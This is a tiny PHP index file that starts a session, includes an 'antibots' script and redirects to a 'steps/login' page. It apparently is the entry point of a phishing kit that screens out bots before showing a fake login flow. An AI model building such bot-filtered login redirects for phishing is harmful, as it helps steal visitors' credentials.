<?php

if (!isset($_SESSION))
{
    session_start();
}

include './antibots/includes.php';


header('location: ./steps/login/index.php');

?>